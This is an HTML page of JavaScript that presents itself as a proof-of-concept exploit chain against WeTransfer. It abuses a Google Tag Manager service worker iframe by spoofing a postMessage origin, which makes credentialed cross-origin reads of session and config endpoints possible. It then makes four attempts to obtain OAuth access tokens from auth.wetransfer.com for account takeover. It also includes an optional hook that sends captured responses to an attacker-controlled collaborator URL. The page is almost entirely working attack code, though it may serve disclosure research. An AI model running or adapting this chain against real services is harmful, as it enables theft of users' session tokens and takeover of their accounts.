<html>
<head>
  <meta charset="UTF-8" />
  <title>WeTransfer SW postMessage → ATO PoC</title>
  <style>
    body { font-family: monospace; background: #111; color: #0f0; padding: 20px; }
    .log { white-space: pre-wrap; margin: 2px 0; }
    .err { color: #f44; }
    .warn { color: #fa0; }
    .ok { color: #0f0; }
    .info { color: #0af; }
    h2 { color: #fff; }
    #output { max-height: 70vh; overflow-y: auto; border: 1px solid #333; padding: 10px; }
    button { background: #0a0; color: #000; border: none; padding: 8px 16px; cursor: pointer; font-family: monospace; font-weight: bold; margin: 5px; }
    button:hover { background: #0f0; }
  </style>
</head>
<body>
  <h2>WeTransfer GTM Service Worker — postMessage Exploit PoC</h2>
  <p style="color:#888">
    Chain: attacker → postMessage → tagging.wetransfer.com/sw_iframe → SW fetch (credentials:include) → CORS read<br>
    Target cookies on auth.wetransfer.com: auth0, did, refresh_token (all SameSite=None; Secure; HttpOnly)
  </p>
  <button onclick="runExploit()">Run Full Exploit Chain</button>
  <button onclick="testTokenRefresh()">Test Token Refresh (ATO)</button>
  <button onclick="testSameOriginRead()">Test Same-Origin Read</button>
  <hr>
  <div id="output"></div>

  <script>
    const ATTACKER_ORIGIN = window.location.origin;
    const TARGET = 'https://tagging.wetransfer.com';
    const SW_IFRAME_PATH = '/_/service_worker/5230/sw_iframe.html';
    const EXFIL = null; // set to your OAST/collaborator URL if needed

    let iframe = null;
    let msgId = 0;
    const pendingResponses = {};

    function log(msg, cls = 'info') {
      const el = document.createElement('div');
      el.className = 'log ' + cls;
      el.textContent = `[${new Date().toISOString().substr(11, 12)}] ${msg}`;
      document.getElementById('output').appendChild(el);
      el.scrollIntoView();
    }

    // ─── Step 1: Embed the SW iframe with spoofed origin ───
    function createIframe() {
      return new Promise((resolve) => {
        if (iframe) { resolve(iframe); return; }

        log(`[1/4] Creating iframe with origin=${ATTACKER_ORIGIN}`, 'info');
        iframe = document.createElement('iframe');
        // The origin param controls which postMessage origin is trusted
        // ancestorOrigins[0] matches our origin → check passes
        iframe.src = `${TARGET}${SW_IFRAME_PATH}?origin=${encodeURIComponent(ATTACKER_ORIGIN)}&1p=1`;
        iframe.style.cssText = 'width:0;height:0;border:none;position:absolute;';
        document.body.appendChild(iframe);

        iframe.onload = () => {
          log(`[1/4] iframe loaded. SW registering on ${TARGET}...`, 'ok');
          // Give the SW time to register and activate
          setTimeout(() => {
            log(`[1/4] SW should be active now`, 'ok');
            resolve(iframe);
          }, 3000);
        };

        iframe.onerror = () => {
          log(`[1/4] iframe failed to load!`, 'err');
        };
      });
    }

    // ─── Step 2: Send a command through the SW ───
    function sendSWCommand(params) {
      return new Promise((resolve, reject) => {
        const id = 'cmd-' + (++msgId);
        const timeout = setTimeout(() => {
          delete pendingResponses[id];
          reject(new Error('Timeout waiting for SW response'));
        }, 15000);

        pendingResponses[id] = (data) => {
          clearTimeout(timeout);
          resolve(data);
        };

        const msg = {
          type: 1,
          clientId: id,
          command: {
            commandType: 0,
            params: params
          }
        };

        log(`[2/4] Sending command: ${params.url.substring(0, 80)}...`, 'info');
        iframe.contentWindow.postMessage(msg, '*');
      });
    }

    // ─── Listen for responses from the SW ───
    window.addEventListener('message', (e) => {
      const data = e.data;
      if (!data || typeof data !== 'object') return;

      const id = data.clientId;
      if (id && pendingResponses[id]) {
        pendingResponses[id](data);
        delete pendingResponses[id];
      }

      // Log all responses
      if (data.result) {
        const preview = typeof data.result.data === 'string'
          ? data.result.data.substring(0, 300)
          : JSON.stringify(data.result).substring(0, 300);
        log(`[RESPONSE] ${preview}`, 'ok');
      }
      if (data.failure) {
        log(`[FAILURE] ${JSON.stringify(data.failure)}`, 'err');
      }

      // Exfiltrate if configured
      if (EXFIL && data.result) {
        fetch(EXFIL, {
          method: 'POST',
          body: JSON.stringify(data),
          mode: 'no-cors'
        }).catch(() => {});
      }
    });

    // ─── Test 1: Same-origin read from tagging.wetransfer.com ───
    async function testSameOriginRead() {
      try {
        await createIframe();
        log('─── Same-Origin Read Test ───', 'warn');

        // Heartbeat first to confirm SW is alive
        log('[2/4] Sending heartbeat...', 'info');
        iframe.contentWindow.postMessage({
          type: 0,
          clientId: 'heartbeat-' + Date.now()
        }, '*');

        await new Promise(r => setTimeout(r, 1000));

        // Fetch GTM container config (same-origin, no cookies needed)
        const gtmResult = await sendSWCommand({
          url: `${TARGET}/gtm.js?id=GTM-NS54WBW`,
          method: 0, // GET
          processResponse: true,
          templates: {}
        });

        if (gtmResult.result && gtmResult.result.data) {
          log(`[3/4] GTM container read: ${gtmResult.result.data.length} bytes`, 'ok');
          log(`[3/4] Preview: ${gtmResult.result.data.substring(0, 200)}...`, 'ok');
        }

        // Fetch the SW iframe source itself
        const iframeSrc = await sendSWCommand({
          url: `${TARGET}${SW_IFRAME_PATH}?origin=https://wetransfer.com`,
          method: 0,
          processResponse: true,
          templates: {}
        });

        if (iframeSrc.result && iframeSrc.result.data) {
          log(`[3/4] SW iframe source read: ${iframeSrc.result.data.length} bytes`, 'ok');
        }

      } catch (err) {
        log(`Error: ${err.message}`, 'err');
      }
    }

    // ─── Test 2: Cross-origin read from wetransfer.com via CORS ───
    async function testCrossOriginRead() {
      log('─── Cross-Origin CORS Read (wetransfer.com) ───', 'warn');

      // wetransfer.com trusts tagging.wetransfer.com via CORS with credentials
      // The 'did' cookie (SameSite=None) on wetransfer.com will be sent
      const sessionResult = await sendSWCommand({
        url: 'https://wetransfer.com/api/v4/auth/session',
        method: 0,
        processResponse: true,
        templates: {}
      });

      if (sessionResult.result && sessionResult.result.data) {
        log(`[3/4] Session endpoint response: ${sessionResult.result.data}`, 'ok');
      }

      // Try to read the app config (contains internal keys)
      const configResult = await sendSWCommand({
        url: 'https://wetransfer.com/api/config.js',
        method: 0,
        processResponse: true,
        templates: {}
      });

      if (configResult.result && configResult.result.data) {
        log(`[3/4] Config.js response: ${configResult.result.data.substring(0, 500)}`, 'ok');
      }
    }

    // ─── Test 3: Token Refresh → ATO ───
    //
    // auth.wetransfer.com has CORS for tagging.wetransfer.com + credentials
    // Three SameSite=None cookies: auth0, did, refresh_token
    //
    // CURRENT BLOCKER: SW fetch sends Content-Type: text/plain for string bodies
    // Auth0 requires application/json or application/x-www-form-urlencoded
    //
    // If this blocker is bypassed, the response contains a fresh JWT access_token
    // which gives full account access (read transfers, contacts, account data)
    //
    async function testTokenRefresh() {
      try {
        await createIframe();
        log('─── Token Refresh ATO Attempt ───', 'warn');
        log('[INFO] auth.wetransfer.com cookies (all SameSite=None):', 'info');
        log('[INFO]   auth0    — Auth0 session (HttpOnly, Secure)', 'info');
        log('[INFO]   did      — Device ID (HttpOnly, Secure)', 'info');
        log('[INFO]   refresh_token — Refresh token (HttpOnly, Secure)', 'info');
        log('[INFO] CORS: auth.wetransfer.com → tagging.wetransfer.com ✓', 'info');

        // Attempt 1: POST with JSON body (Content-Type will be text/plain)
        log('[ATTEMPT 1] POST /oauth/token with JSON body (text/plain)...', 'warn');
        try {
          const tokenResult = await sendSWCommand({
            url: 'https://auth.wetransfer.com/oauth/token',
            method: 1, // POST
            body: JSON.stringify({
              grant_type: 'refresh_token',
              client_id: 'dXWFQjiW1jxWCFG0hOVpqrk4h9vGeanc',
              audience: 'aud://transfer-api-prod.wetransfer/'
            }),
            processResponse: true,
            templates: {}
          });

          if (tokenResult.result && tokenResult.result.data) {
            const data = tokenResult.result.data;
            log(`[RESULT] Response: ${data.substring(0, 500)}`, data.includes('access_token') ? 'ok' : 'warn');
            if (data.includes('access_token')) {
              log('[!!!] GOT ACCESS TOKEN — FULL ACCOUNT TAKEOVER', 'ok');
              const parsed = JSON.parse(data);
              log(`[!!!] Token: ${parsed.access_token.substring(0, 50)}...`, 'ok');
            }
          }
        } catch (err) {
          log(`[ATTEMPT 1] ${err.message}`, 'err');
        }

        // Attempt 2: POST with URL-encoded body
        log('[ATTEMPT 2] POST with URL-encoded body (still text/plain)...', 'warn');
        try {
          const tokenResult2 = await sendSWCommand({
            url: 'https://auth.wetransfer.com/oauth/token',
            method: 1,
            body: 'grant_type=refresh_token&client_id=dXWFQjiW1jxWCFG0hOVpqrk4h9vGeanc&audience=aud%3A%2F%2Ftransfer-api-prod.wetransfer%2F',
            processResponse: true,
            templates: {}
          });

          if (tokenResult2.result && tokenResult2.result.data) {
            const data = tokenResult2.result.data;
            log(`[RESULT] Response: ${data.substring(0, 500)}`, data.includes('access_token') ? 'ok' : 'warn');
            if (data.includes('access_token')) {
              log('[!!!] GOT ACCESS TOKEN — FULL ACCOUNT TAKEOVER', 'ok');
            }
          }
        } catch (err) {
          log(`[ATTEMPT 2] ${err.message}`, 'err');
        }

        // Attempt 3: GET with params in query string
        log('[ATTEMPT 3] GET /oauth/token with query params...', 'warn');
        try {
          const tokenResult3 = await sendSWCommand({
            url: 'https://auth.wetransfer.com/oauth/token?grant_type=refresh_token&client_id=dXWFQjiW1jxWCFG0hOVpqrk4h9vGeanc&audience=aud%3A%2F%2Ftransfer-api-prod.wetransfer%2F',
            method: 0, // GET
            processResponse: true,
            templates: {}
          });

          if (tokenResult3.result && tokenResult3.result.data) {
            log(`[RESULT] Response: ${tokenResult3.result.data.substring(0, 500)}`, 'warn');
          }
        } catch (err) {
          log(`[ATTEMPT 3] ${err.message}`, 'err');
        }

        // Attempt 4: Use auth_session grant type (listed in Auth0 error as valid)
        log('[ATTEMPT 4] POST with auth_session grant type...', 'warn');
        try {
          const tokenResult4 = await sendSWCommand({
            url: 'https://auth.wetransfer.com/oauth/token',
            method: 1,
            body: JSON.stringify({
              grant_type: 'auth_session',
              client_id: 'dXWFQjiW1jxWCFG0hOVpqrk4h9vGeanc',
              audience: 'aud://transfer-api-prod.wetransfer/',
              scope: 'openid email profile offline_access'
            }),
            processResponse: true,
            templates: {}
          });

          if (tokenResult4.result && tokenResult4.result.data) {
            const data = tokenResult4.result.data;
            log(`[RESULT] Response: ${data.substring(0, 500)}`, data.includes('access_token') ? 'ok' : 'warn');
            if (data.includes('access_token')) {
              log('[!!!] GOT ACCESS TOKEN via auth_session — FULL ACCOUNT TAKEOVER', 'ok');
            }
          }
        } catch (err) {
          log(`[ATTEMPT 4] ${err.message}`, 'err');
        }

        log('─── Token refresh attempts complete ───', 'warn');
        log('[NOTE] If all failed with "clientId should not be empty":', 'info');
        log('[NOTE] → Auth0 rejects text/plain Content-Type (SW limitation)', 'info');
        log('[NOTE] → The cookies ARE sent (SameSite=None), confirmed via browser inspection', 'info');
        log('[NOTE] → If Content-Type bypass is found, this is full ATO', 'info');

      } catch (err) {
        log(`Error: ${err.message}`, 'err');
      }
    }

    // ─── Full chain ───
    async function runExploit() {
      document.getElementById('output').innerHTML = '';
      log('═══ WeTransfer GTM SW postMessage Exploit ═══', 'warn');
      log(`Attacker origin: ${ATTACKER_ORIGIN}`, 'info');
      log('', 'info');

      try {
        // Step 1: Create iframe
        await createIframe();

        // Step 2: Same-origin reads (no cookies needed)
        await testSameOriginRead();

        // Step 3: Cross-origin reads via CORS trust
        await testCrossOriginRead();

        // Step 4: ATO attempt
        await testTokenRefresh();

        log('', 'info');
        log('═══ Exploit chain complete ═══', 'warn');

      } catch (err) {
        log(`Fatal error: ${err.message}`, 'err');
      }
    }
  </script>
</body>
</html>
